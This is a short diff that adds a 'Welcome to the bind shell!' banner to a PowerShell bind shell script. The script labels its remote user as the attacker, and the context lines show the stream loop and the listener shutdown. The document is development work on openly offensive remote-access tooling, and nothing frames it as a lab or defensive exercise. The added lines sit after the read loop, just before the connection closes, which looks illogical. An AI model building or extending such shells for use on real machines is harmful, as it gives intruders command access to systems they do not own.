@@ -16,5 +16,12 @@ while(($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
     $stream.Flush()
 }
 
+#Send a welcome message to attacker
+$welcomeMessage = "Welcome to the bind shell!`n"
+$bytes = [System.Text.Encoding]::ASCII.GetBytes($welcomeMessage)
+$stream.Write($bytes, 0, $bytes.Length)
+$stream.Flush()
+
+
 $client.Close()
 $listener.Stop()
